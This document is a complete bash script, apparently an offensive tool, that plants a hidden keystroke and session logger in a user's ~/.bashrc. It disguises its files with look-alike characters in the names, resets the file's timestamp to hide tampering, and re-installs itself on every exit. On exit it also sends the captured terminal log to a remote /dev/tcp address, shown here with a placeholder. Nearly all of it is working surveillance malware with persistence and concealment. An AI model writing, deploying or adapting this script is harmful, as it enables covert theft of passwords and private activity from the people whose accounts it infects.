#!/bin/bash
# CUSTIMIZE BEFORE UPLOAD

fakerc=~/.bаsh_login
logfile=~/.bаsh_cache
remote=/dev/tcp/127.0.0.1/1234
waitsec=1
changetime=$(stat -c %Y ~/.bashrc)

read script <<EOF
exec script -B "$logfile" -fqc "bash --rcfile '$fakerc'"
EOF
quoted=$(printf "%q" "$script")

# UI BEGIN

print() { echo -e "$*"; }
printvar() { printf " + \e[1;32m%s\e[m = \e[4;5m%s\e[m\n" $1 "${!1}"; }

printvar fakerc
printvar logfile
printvar script
printvar remote

print "\e[5;7m  wait for \e[1m$waitsec\e[0;5;7m secs, ctrl+c to interrupt  \e[m"
sleep $waitsec
print "installing..."

# UI END

cat >"$fakerc" <<EOF
self=\$(cat "$fakerc")
self=\$(printf "%q" "\$self")
rm -f "$fakerc"
sed -i "/^exec script -B/d" ~/.bashrc
touch -d @$changetime ~/.bashrc
trap "2>/dev/null cat '$logfile' > '$remote' && echo $quoted >> ~/.bashrc && echo \$self > '$fakerc'; rm -f '$logfile'" EXIT
unset self
. ~/.bashrc
EOF
echo $script >> ~/.bashrc
